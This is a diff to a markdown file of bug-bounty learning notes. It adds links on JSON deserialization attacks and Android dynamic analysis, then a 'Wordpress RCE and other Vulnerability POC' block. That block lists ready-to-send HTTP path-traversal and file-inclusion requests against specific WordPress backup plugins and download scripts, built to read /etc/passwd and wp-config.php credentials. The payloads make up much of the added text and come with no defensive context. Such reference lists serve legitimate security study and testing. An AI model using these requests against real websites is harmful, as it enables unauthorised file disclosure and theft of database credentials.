@@ -170,3 +170,21 @@ haking How-To Series with [@cobalt_io](https://twitter.com/cobalt_io)
 ## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 53
 - [JS Prototype Pollution](https://youtu.be/J3MIOIqvV8w)
 
+# 📅 24-Feb-2021
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 54
+- [JSON Deserialization Attacks](https://github.com/harsh-bothra/learn365/blob/main/days/day54.md)
+
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 55
+- [ Android App Dynamic Analysis using House](https://github.com/harsh-bothra/learn365/blob/main/days/day55.md)
+
+## Wordpress RCE and other Vulnerability POC
+```http
+GET /wp-admin/admin.php?page=supsystic-backup&tab=bupLog&download=../../../../../../../../../etc/passwd
+GET /index.php?page=../../../../etc/passwd
+GET /index.php?page=/etc/passwd
+GET /download.php?file=../../../../../../../../../../etc/passwd
+GET /wp-content/force-download.php?file=..%2Fwp-config.php
+GET /wp-content/plugins/BackUp/Archive.php?bkpwp_plugin_path=..%2F..%2F..%2Fwp-config.php
+GET /wp-content/plugins/BackUp/Archive/Predicate.php?bkpwp_plugin_path=..%2F..%2F..%2F..%2Fwp-config.php 
+GET /wp-content/plugins/BackUp/Archive/Reader.php?bkpwp_plugin_path=..%2F..%2F..%2F..%2Fwp-config.php
+```
